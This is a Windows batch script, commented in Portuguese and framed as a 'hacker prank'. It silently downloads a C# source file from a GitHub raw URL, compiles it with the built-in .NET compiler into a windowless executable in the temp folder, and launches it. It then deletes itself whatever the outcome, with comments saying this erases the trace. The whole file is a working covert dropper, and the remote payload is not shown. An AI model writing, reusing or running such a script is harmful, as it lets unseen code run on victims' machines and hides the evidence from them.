@echo off
:: --- CONFIGURAÇÕES ---
set "GITHUB_RAW_URL=https://raw.githubusercontent.com/espertin/wind/main/TrolagemHacker_GitHub.cs"
set "TEMP_CS=%temp%\TrolagemHacker.cs"
set "EXE_OUT=%temp%\TrolagemHacker.exe"

:: --- LOCALIZAR COMPILADOR DO WINDOWS (.NET) ---
set "CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC_PATH%" set "CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

:: --- DOWNLOAD DO CÓDIGO DO GITHUB ---
powershell -Command "(New-Object Net.WebClient).DownloadFile('%GITHUB_RAW_URL%', '%TEMP_CS%')" >nul 2>&1

:: --- COMPILAÇÃO SILENCIOSA ---
if exist "%TEMP_CS%" (
    "%CSC_PATH%" /target:winexe /out:"%EXE_OUT%" "%TEMP_CS%" >nul 2>&1
)

:: --- EXECUÇÃO AUTOMÁTICA E LIMPEZA DO BATCH ---
if exist "%EXE_OUT%" (
    :: Inicia a trolagem
    start "" "%EXE_OUT%"
    
    :: Apaga o próprio arquivo .bat (Shift+Delete simulado via /f /q)
    (goto) 2>nul & del /f /q "%~f0"
    exit
) else (
    :: Se algo der errado, apaga o rastro e sai
    (goto) 2>nul & del /f /q "%~f0"
    exit
)
